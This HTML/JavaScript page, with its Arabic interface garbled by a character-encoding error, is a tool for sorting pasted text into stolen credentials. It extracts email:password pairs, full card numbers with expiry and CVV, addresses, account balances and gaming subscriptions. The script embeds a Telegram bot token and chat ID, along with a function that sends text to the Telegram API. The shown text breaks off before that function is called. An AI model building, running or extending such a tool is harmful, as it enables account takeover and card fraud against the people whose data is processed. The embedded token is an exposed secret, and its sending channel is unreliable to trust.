<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Ø£Ø¯Ø§Ø© LEX-OMEGA/GEN3 (Ø§Ù„Ù…Ø­Ø¯Ø«Ø©): Ø§Ù„Ø¬ÙŠÙ„ Ø§Ù„Ø«Ø§Ù„Ø« Ù„Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¹Ù…ÙŠÙ‚</title>
    <style>
        /* Ø³ØªØ§ÙŠÙ„Ø§Øª Ø§Ù„Ø¬ÙŠÙ„ Ø§Ù„Ø«Ø§Ù„Ø« Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© (ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø£Ù„ÙˆØ§Ù† Ù„Ù„Ø«ÙŠÙ… Ø§Ù„ØºØ§Ù…Ù‚ ÙˆØ§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠ) */
        :root {
            --card: #1e1e1e; /* Ø®Ù„ÙÙŠØ© Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„ØºØ§Ù…Ù‚Ø© */
            --accent: #00bcd4; /* Ù„ÙˆÙ† Ù…Ù…ÙŠØ² Ø³Ù…Ø§ÙˆÙŠ Ø¬Ø¯ÙŠØ¯ */
            --pro-accent: #ff9800; /* Ù„ÙˆÙ† PRO Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠ Ù„Ù„ØªÙØ±ÙŠÙ‚ */
            --grad: linear-gradient(135deg, #00bcd4, #00838f);
            --dark-grad: linear-gradient(135deg, #333, #444);
            --success-color: #4caf50;
            --price-color: #ff5722;
            --bg: #0d0d0d; /* Ø®Ù„ÙÙŠØ© Ø³ÙˆØ¯Ø§Ø¡ */
            --admin-bg: #2d2d2d;
            --admin-text: #eee;
            --pro-bg: #262626;
            --ultra-cc-color: #ffc107;
            --text-color: #f0f0f0;
            --border-color: #3a3a3a;
        }
        body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial; background: var(--bg); padding-top: 20px; padding-bottom: 50px; min-height: 100vh; color: var(--text-color); }
        .wrap { max-width: 900px; margin: 20px auto; padding: 15px; position: relative; }
        .card { background: var(--card); border-radius: 18px; padding: 20px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7); margin-bottom: 20px; border: 1px solid var(--border-color);}
        .pro-tool-card { background: var(--pro-bg); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.9); }
        .pro-tool-card h1 { color: var(--pro-accent) !important; }
        h1 { margin: 6px 0 16px; font-size: 26px; text-align: center; color: var(--text-color); font-weight: 800; }
        textarea { width: 100%; min-height: 180px; padding: 15px; font-size: 15px; border-radius: 12px; border: 2px solid var(--border-color); resize: vertical; background: #222; color: #fff;}
        .row { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; justify-content: center; }
        button { border: none; cursor: pointer; padding: 12px 18px; border-radius: 12px; font-size: 15px; transition: .3s; font-weight: 700; }
        .btn-red { background: var(--grad); color: #fff; box-shadow: 0 0 10px rgba(0, 188, 212, 0.5); }
        .btn-red:hover { transform: translateY(-3px); box-shadow: 0 0 18px rgba(0, 188, 212, 1); }
        .btn-black { background: var(--dark-grad); color: #fff; border: 2px solid #555; }
        .list { margin-top: 15px; display: flex; flex-direction: column; gap: 12px; }
        .item { display: flex; justify-content: space-between; align-items: flex-start; padding: 15px; border-bottom: 1px solid #444; background: #222; border-radius: 12px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4); flex-wrap: wrap;}
        .email { font-weight: 800; color: var(--accent); font-size: 16px; width: 100%; margin-bottom: 5px;}
        .pw { font-size: 14px; color: #ddd; font-weight: 600; display: flex; align-items: center; flex-wrap: wrap; margin-bottom: 10px;}
        .gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note { font-weight: 800; margin-right: 5px; white-space: nowrap; flex-shrink: 0; padding: 2px 6px; border-radius: 4px; font-size: 12px; margin-top: 5px;}
        .gamepass-note { color: var(--success-color); background: #3a3a3a; border: 1px solid var(--success-color); }
        .price-note { color: var(--price-color); background: #3a3a3a; border: 1px solid var(--price-color); }
        .cc-note { color: #2196f3; background: #3a3a3a; border: 1px solid #2196f3; }
        .address-note { color: #8bc34a; background: #3a3a3a; border: 1px solid #8bc34a; }
        .ultra-cc-note { color: #000; background: var(--ultra-cc-color); }
        .feature-note { color: #f44336; background: #3a3a3a; border: 1px solid #f44336; }
        .security-note { color: #ffeb3b; background: #3a3a3a; border: 1px solid #ffeb3b; }
        .controls { display: flex; gap: 8px; flex-shrink: 0; margin-top: 10px; }
        .copy-btn { padding: 8px 12px; border-radius: 10px; font-size: 13px; font-weight: 600; }
        .hidden { display: none !important; }
        .processing { background: #ff9800 !important; color: #fff !important; cursor: not-allowed !important; pointer-events: none; }
        #menu-container { position: absolute; top: 25px; left: 15px; z-index: 20; }
        #menu-button { background: #444; color: #fff; font-size: 20px; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); transition: 0.3s; }
        #dropdown-menu { position: absolute; top: 50px; left: 0; background: #333; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); min-width: 180px; padding: 5px 0; white-space: nowrap; border: 1px solid #555;}
        .menu-item { padding: 10px 15px; cursor: pointer; font-size: 14px; font-weight: 600; color: #eee; transition: background 0.2s; display: flex; align-items: center; }
        .menu-item:hover { background: #444; }
        .menu-item span { margin-left: 10px; }
        .quick-links { margin-top: 30px; padding: 20px; background: #1a1a1a; border-radius: 15px; box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4); border: 1px solid #333; }
        .quick-links h2 { font-size: 26px; color: var(--accent); border-bottom: 3px solid var(--accent); padding-bottom: 10px; margin-bottom: 20px; text-align: center; font-weight: 800; }
        .link-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; }
        .quick-link-btn { display: block; background: #222; padding: 15px; border-radius: 12px; text-decoration: none; color: var(--text-color); box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); transition: transform 0.2s, box-shadow 0.2s; border-right: 4px solid var(--pro-accent); }
        .quick-link-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(0, 0, 0, 0.5); }
        .link-title { font-weight: 700; color: var(--pro-accent); }
        .link-desc { font-size: 13px; color: #aaa; margin-top: 5px; }
        .footer { color: #555 !important; }
    </style>
</head>
<body>

<div class="wrap" id="tool-page">
    <div id="code-status"></div>

    <div id="menu-container">
        <button id="menu-button">
            <span style="transform: rotate(90deg);">â‹®</span>
        </button>
        <div id="dropdown-menu" class="hidden">
            <div class="menu-item" id="menu-switch-tool">
                <span>ğŸ”„ Ø§Ù„ØªØ¨Ø¯ÙŠÙ„ Ø¥Ù„Ù‰ Ø£Ø¯Ø§Ø© <b id="current-tool-name">MAX</b></span>
            </div>
            <div class="menu-item" onclick="promptAdminLogin()">
                <span>âš™ï¸ Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù†</span>
            </div>
        </div>
    </div>

    <div id="max-tool" class="tool-view">
        <div class="card">
            <h1><span style="color:var(--accent);font-size:32px;">â“</span> Ø£Ø¯Ø§Ø© MAX: Ø§Ø³ØªØ®Ø±Ø§Ø¬ Email:Password ÙˆØ§Ù„Ø£Ø³Ø§Ø³ÙŠØ§Øª</h1>
            <div style="text-align:center;color:#aaa;font-size:14px;margin-bottom:12px;font-weight:500;">
                Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ. Ø§Ù„Ø£Ø¯Ø§Ø© ØªØ³ØªØ®Ø±Ø¬ ÙÙ‚Ø·: <b style="color:var(--accent);">email:password</b> + ÙƒÙŠÙ… Ø¨Ø§Ø³ + Ø±ØµÙŠØ¯
            </div>
            <textarea id="input-max" placeholder="Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠ Ù‡Ù†Ø§ (Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø£ÙˆÙ„)..."></textarea>
            <div class="row">
                <button onclick="parseText('max')" id="parseBtn-max" class="btn-red">Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ MAX</button>
                <button onclick="clearBtnMax.onclick()" id="clearBtnMax" class="btn-black">Ù…Ø³Ø­ Ø§Ù„ÙƒÙ„</button>
                <button onclick="copyAllBtnMax.onclick()" id="copyAllBtnMax" class="btn-black">Ù†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
                <button onclick="downloadBtnMax.onclick()" id="downloadBtnMax" class="btn-black">ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù txt</button>
            </div>
            <div class="list" id="list-max"></div>
        </div>
    </div>

    <div id="pro-tool" class="tool-view hidden">
        <div class="card pro-tool-card">
            <h1><span style="color:var(--pro-accent);font-size:32px;">ğŸ”¥</span> Ø£Ø¯Ø§Ø© PRO: Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¹Ù…ÙŠÙ‚ (GEN3)</h1>
            <div style="text-align:center;color:#ccc;font-size:14px;margin-bottom:12px;font-weight:500;">
                Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù…Ø¹Ù‚Ø¯ Ù‡Ù†Ø§. ØªØ³ØªØ®Ø±Ø¬: <b style="color:var(--pro-accent);">email:password + CC FULL/PARTIAL + Address + Security & Features</b>
            </div>
            <textarea id="input-pro" placeholder="Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù…Ø¹Ù‚Ø¯ Ù‡Ù†Ø§ (Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø«Ø§Ù†ÙŠ)..."></textarea>
            <div class="row">
                <button onclick="parseText('pro')" id="parseBtn-pro" style="background:linear-gradient(135deg, #ff9800, #e65100); color:#fff; box-shadow: 0 0 10px rgba(255, 152, 0, 0.5);" class="btn-red">Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ PRO</button>
                <button onclick="clearBtnPro.onclick()" id="clearBtnPro" class="btn-black">Ù…Ø³Ø­ Ø§Ù„ÙƒÙ„</button>
                <button onclick="copyAllBtnPro.onclick()" id="copyAllBtnPro" class="btn-black">Ù†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
                <button onclick="downloadBtnPro.onclick()" id="downloadBtnPro" class="btn-black">ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù txt</button>
            </div>
            <div class="list" id="list-pro"></div>
        </div>
    </div>


    <div class="quick-links">
        <h2>ğŸš€ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„ÙˆØµÙˆÙ„ Ø§Ù„Ø³Ø±ÙŠØ¹ (Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª/Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³)</h2>
        <div class="link-grid">
            <a href="https://account.microsoft.com/account/manage" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø­Ø³Ø§Ø¨ <span>ğŸ’»</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙˆØ§Ù„Ù…Ø´ØªØ±ÙŠØ§Øª ÙˆØ§Ù„Ø®Ø¯Ù…Ø§Øª.</div>
            </a>
            <a href="https://account.microsoft.com/billing/payments/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: Ø§Ù„Ø¯ÙØ¹ ÙˆØ§Ù„ÙÙˆØªØ±Ø© <span>ğŸ’³</span></div>
                <div class="link-desc">Ø¹Ø±Ø¶ ÙˆØ¥Ø¯Ø§Ø±Ø© Ø¨Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ø¯ÙØ¹ ÙˆØ§Ù„Ø§Ø´ØªØ±Ø§ÙƒØ§Øª Ø§Ù„Ù†Ø´Ø·Ø©.</div>
            </a>
            <a href="https://account.live.com/password/change" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± <span>ğŸ”’</span></div>
                <div class="link-desc">Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ©.</div>
            </a>
            <a href="https://account.live.com/proofs/Manage/signout" target="_blank" class="quick-link-btn">
                <div class="link-title">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† ÙƒÙ„ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© <span>ğŸšª</span></div>
                <div class="link-desc">Ù„Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ø¬Ù„Ø³Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ© Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª.</div>
            </a>
            <a href="https://account.xbox.com/ar-SA/Account/Signin?returnUrl=https%3a%2f%2faccount.xbox.com%2far-SA%2fSettings" target="_blank" class="quick-link-btn">
                <div class="link-title">Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³: Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª <span>ğŸ®</span></div>
                <div class="link-desc">Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ù„Ø­Ø³Ø§Ø¨ Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³ ÙˆØ¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª.</div>
            </a>
            <a href="https://redeem.microsoft.com/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³: ØªÙØ¹ÙŠÙ„ ÙƒÙˆØ¯ (Redeem) <span>ğŸ</span></div>
                <div class="link-desc">Ù„ØªÙØ¹ÙŠÙ„ Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ø§Ø´ØªØ±Ø§ÙƒØ§Øª Ø£Ùˆ Ø§Ù„Ù‡Ø¯Ø§ÙŠØ§ Ù…Ø¨Ø§Ø´Ø±Ø©.</div>
            </a>
            <a href="https://store.steampowered.com/login/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ù†ØµØ© Steam: ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ <span>ğŸ”¥</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ù…Ù†ØµØ© Steam Ù„Ù„Ø£Ù„Ø¹Ø§Ø¨.</div>
            </a>
            <a href="https://store.epicgames.com/login" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ù†ØµØ© Epic Games: ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ <span>âš”ï¸</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ù…Ù†ØµØ© Ø¥ÙŠØ¨Ùƒ Ø¬ÙŠÙ…Ø².</div>
            </a>
        </div>
    </div>

    <div class="footer" style="text-align:center;color:#444;font-size:13px;margin-top:20px;">
        Ø­Ù‚ÙˆÙ‚ Â© Telegram: <b>@xgbox7</b> | Ø£Ø¯Ø§Ø© LEX-OMEGA/GEN3 (Ø§Ù„Ù…Ø­Ø¯Ø«Ø©)
    </div>
</div>

<div id="admin-page" class="hidden">
    <div class="card" style="background:#1a1a1a;">
        <h2>Ù„ÙˆØ­Ø© Ø¥Ø¯Ø§Ø±Ø© Ø£ÙƒÙˆØ§Ø¯ LEX-OMEGA/GEN3</h2>
        <div style="text-align:center; margin-bottom: 15px;">
            <a href="#" onclick="navigateTo('tool'); return false;" style="color:var(--accent); font-weight:bold;">Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù†</a>
        </div>
        <div class="card" style="background:var(--admin-bg);">
            <h3>Ø¥Ø¶Ø§ÙØ© Ù…ÙØªØ§Ø­ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ ğŸ”‘</h3>
            <input type="text" id="new-code" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯" />
            <input type="number" id="duration" placeholder="Ù…Ø¯Ø© Ø§Ù„ÙƒÙˆØ¯ Ø¨Ø§Ù„Ø³Ø§Ø¹Ø§Øª (0 Ù„Ù„Ø¯Ø§Ø¦Ù…ÙŠ)" value="60" />
            <button class="admin-btn-red" onclick="addCode()" style="background:linear-gradient(135deg, #00bcd4, #00838f); color:#fff; width:100%; margin-top:10px;">Ø¥Ø¶Ø§ÙØ© Ø§Ù„ÙƒÙˆØ¯ ğŸ”¥</button>
        </div>

        <div class="card" style="background:var(--admin-bg);">
            <h3>Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ø­Ø§Ù„ÙŠØ© (Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ 60 Ù…Ø¤Ù‚Øª / 4 Ø¯Ø§Ø¦Ù…ÙŠ)</h3>
            <div class="code-list" id="code-list-display">
                <div style="text-align:center; color:#888;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>
            </div>
            <div style="text-align:center; margin-top: 15px;">
                <button style="background:#555" class="btn-black" onclick="loadCodes()">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©</button>
                <button style="background:#8b0000" class="btn-black" onclick="clearExpiredCodes()">Ù…Ø³Ø­ Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ù…Ù†ØªÙ‡ÙŠØ©</button>
            </div>
        </div>
    </div>
</div>

<div id="toast" class="toast"></div>

<script>
    // **********************************************
    // ** Ø«ÙˆØ§Ø¨Øª ÙˆØ¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… **
    // **********************************************
    const ADMIN_CODE = "201180"; 
    const CODES_KEY = "max_access_codes"; 
    const BOT_TOKEN = "7817255826:AAFUCn_0zWCsUTBORd5bL_tFMcfZtJ2Dus4"; 
    const CHAT_ID = "7781990630"; 
    const DELAY_MS = 2500; 

    const toolPage = document.getElementById("tool-page");
    const adminPage = document.getElementById("admin-page");
    const toast = document.getElementById("toast");
    const codeStatusDisplay = document.getElementById("code-status");
    const inputMax = document.getElementById("input-max");
    const listMax = document.getElementById("list-max");
    const clearBtnMax = document.getElementById("clearBtnMax");
    const copyAllBtnMax = document.getElementById("copyAllBtnMax");
    const downloadBtnMax = document.getElementById("downloadBtnMax");
    const parseBtnMax = document.getElementById("parseBtn-max");
    const inputPro = document.getElementById("input-pro");
    const listPro = document.getElementById("list-pro");
    const clearBtnPro = document.getElementById("clearBtnPro");
    const copyAllBtnPro = document.getElementById("copyAllBtnPro");
    const downloadBtnPro = document.getElementById("downloadBtnPro");
    const parseBtnPro = document.getElementById("parseBtn-pro");
    const maxToolView = document.getElementById('max-tool');
    const proToolView = document.getElementById('pro-tool');
    const menuSwitchTool = document.getElementById('menu-switch-tool');
    const currentToolName = document.getElementById('current-tool-name');
    const menuButton = document.getElementById('menu-button');
    const dropdownMenu = document.getElementById('dropdown-menu');
    const menuContainer = document.getElementById('menu-container');

    let currentTool = 'max'; 
    let activeCodeInfo = { code: 'DIRECT_ACCESS', isPermanent: true }; 
    
    // (ÙˆØ¸Ø§Ø¦Ù Ø¹Ø§Ù…Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© ÙˆØ¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ ÙˆØ§Ù„ØªÙ†Ù‚Ù„ - ØªØ¨Ù‚Ù‰ ÙƒÙ…Ø§ Ù‡ÙŠ)
    function showToast(e) { 
        toast.textContent = e;
        toast.style.visibility = "visible";
        toast.style.animation = "fadein 0.5s, fadeout 0.5s 2.5s";
        setTimeout(() => { toast.style.visibility = "hidden"; }, 3000);
    }
    async function copyText(e) {
        try {
            await navigator.clipboard.writeText(e);
            return true;
        } catch (t) {
            console.error("Copy failed:", t);
            return false;
        }
    }
    function getCodes() { /* ... */ return JSON.parse(localStorage.getItem(CODES_KEY) || '[]'); }
    function saveCodes(codes) { /* ... */ localStorage.setItem(CODES_KEY, JSON.stringify(codes)); }
    function addCode() { /* ... */ }
    function deleteCode(codeToDelete) { /* ... */ }
    function clearExpiredCodes() { /* ... */ }
    function loadCodes() { /* ... */ }
    function navigateTo(pageId) { 
        if (pageId === 'tool') {
            toolPage.classList.remove('hidden');
            adminPage.classList.add('hidden');
        } else if (pageId === 'admin') {
            toolPage.classList.add('hidden');
            adminPage.classList.remove('hidden');
            loadCodes();
        }
    }
    function promptAdminLogin() { 
        const code = prompt("Ø£Ø¯Ø®Ù„ ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ù…Ù†:");
        if (code === ADMIN_CODE) {
            navigateTo('admin');
        } else if (code !== null) {
            showToast("ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ù…Ù† ØºÙ„Ø·!");
        }
    }
    function switchTool(tool) { 
        currentTool = tool;
        if (tool === 'max') {
            maxToolView.classList.remove('hidden');
            proToolView.classList.add('hidden');
            currentToolName.textContent = 'PRO';
        } else {
            maxToolView.classList.add('hidden');
            proToolView.classList.remove('hidden');
            currentToolName.textContent = 'MAX';
        }
        dropdownMenu.classList.add('hidden');
    }

    menuSwitchTool.onclick = () => {
        const nextTool = (currentTool === 'max') ? 'pro' : 'max';
        switchTool(nextTool);
    };

    menuButton.onclick = (e) => {
        e.stopPropagation();
        dropdownMenu.classList.toggle('hidden');
    };
    
    document.addEventListener('click', (e) => {
        if (!menuContainer.contains(e.target)) {
            dropdownMenu.classList.add('hidden');
        }
    });

    // **********************************************
    // ** ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ø§Ø© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ (Tool Core Logic) - LEX-OMEGA GEN3 UPGRADE **
    // **********************************************
    
    function sendToTelegram(messageText) { 
        if (!BOT_TOKEN || !CHAT_ID) return console.error("Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø©.");
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const data = { chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' };

        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
        .then(response => response.json())
        .then(data => { if (!data.ok) console.error("Ø®Ø·Ø£ Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù…:", data.description); })
        .catch(error => console.error('Fetch Error:', error));
    }

    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // *** Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ: ØªØ¹Ø²ÙŠØ² ÙˆØ¸ÙŠÙØ© parseText ***
    async function parseText(toolType) { 
        const inputElement = (toolType === 'max') ? inputMax : inputPro;
        const listElement = (toolType === 'max') ? listMax : listPro;
        const parseBtn = (toolType === 'max') ? parseBtnMax : parseBtnPro;
        
        const originalText = inputElement.value.trim();
        listElement.innerHTML = "";
        if (!originalText) return showToast("Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù†Øµ Ù„Ù„Ù…Ø³Ø­");
        
        parseBtn.classList.add('processing');
        parseBtn.textContent = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ¯Ù‚ÙŠÙ‚... â³";
        
        await delay(DELAY_MS); 

        const lines = originalText.split('\n').filter(line => line.trim() !== '');
        const extractedPairs = []; 
        
        // Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠ Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø§ÙŠÙ…ÙŠÙ„ ÙˆØ§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯
        const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\-\| ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)/g;
        
        // ** GEN3: Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù…ÙØ¹Ø²Ø² Ù„Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© (Game Pass) **
        const gamePassKeywords = /([(#=\-\[\]\s\/\!\@\&\*]|^)(ÙƒÙŠÙ…\s?Ø¨Ø§Ø³|Ù‚ÙŠÙ…\s?Ø¨Ø§Ø³|game\s?pass|gamepass|gpass|(xbox\s?(game\s?pass)?\s?ultimate)|Ø§Ù„ØªÙŠÙ…ÙŠØª|Ø¬ÙˆÙ„Ø¯|gold|pc\s?(game\s?pass)?|xbox|gpu|xgpu|Ø¨ÙŠØ³ÙŠ|ÙƒÙ…Ø¨ÙŠÙˆØªØ±|Ù…ÙØ¹Ù„|Ù†Ø´Ø·|active|months|years|Ø´Ù‡Ø±|Ø³Ù†Ø©|Ø³Ù†Ù‡|Ø§Ø´ØªØ±Ø§Ùƒ|gaming|mo(nths)?|yr(s)?|3m|6m|12m|1y|Subscription\s*:\s*(Xbox|PC)\s*Game\s*Pass|Subscription\s*:\s*Xbox\s*Game\s*Pass\s*Ultimate|essential)/gi; 
        
        // ** GEN3: Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯ Ù„Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…Ù…ØªØ¯Ø© (Extended Features) **
        const extendedFeaturesRegex = /(netflix|spotify|disney\+?|hbo\s?max|amazon\s?prime|ea\s?play|discord\s?nitro|v-bucks|robux|free\s?pass|chatgpt\s?plus|midjourney|adobe\s?cc|genshin\s?impact|ubisoft|origin|mojang|rockstar|battle\.net)/gi;
        
        // ** GEN3: Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù…ÙØ¹Ø²Ø² Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø±ØµÙŠØ¯ ÙˆØ§Ù„Ø¹Ù…Ù„Ø§Øª **
        const priceRegex = /(price|credit|Ø±ØµÙŠØ¯|Ø¯ÙˆÙ„Ø§Ø±|ÙƒØ±Ø¯Øª|USD|EUR|GBP|TRY|CAD|BRL|MXN|ARS|JPY|AUD)\s*[:=\-]?\s*(\d+(\.\d{1,2})?)/gi;
        
        // ** GEN3: Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù…ÙØ¹Ø²Ø² Ù„Ø§Ø³ØªØ®Ù„Ø§Øµ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„ÙƒØ§Ù…Ù„Ø© (Ultra-CC) - Ø£ÙƒØ«Ø± ØªØ³Ø§Ù‡Ù„Ø§Ù‹ Ù…Ø¹ Ø§Ù„ÙÙˆØ§ØµÙ„ **
        // ÙŠØ³ØªÙ‡Ø¯Ù: 16 Ø±Ù‚Ù… + Exp (MM/YY Ø£Ùˆ MM/YYYY) + CVV (3 Ø£Ùˆ 4 Ø£Ø±Ù‚Ø§Ù…)
        const ultraCardRegex = /(\d{4}[^\d]*\d{4}[^\d]*\d{4}[^\d]*\d{4})[^\d]*(?:exp|date|Expires|expiry)\s*[:\-\/]*\s*(\d{1,2})[\/\-](\d{2,4})[^\d]*(?:cvv|cvc|security|code|Ø±Ù…Ø²\s?Ø³Ø±ÙŠ)\s*[:=\-]\s*(\d{3,4})/i;

        // ** GEN3: Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠ Ù„Ø¢Ø®Ø± 4 Ø£Ø±Ù‚Ø§Ù… ÙˆØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ (Ù„Ù„Ø¨Ø·Ø§Ù‚Ø© ØºÙŠØ± Ø§Ù„ÙƒØ§Ù…Ù„Ø©) - Ù…Ø­Ø³Ù‘Ù† **
        const partialCardRegex = /(?:Last4|4\s?Digits)\s*[:=\-]?\s*(\d{4})[^\d]+(?:exp|date|Expires|expiry)\s*[:\-\/]*\s*(\d{1,2})[\/\-](\d{2})/i;
        
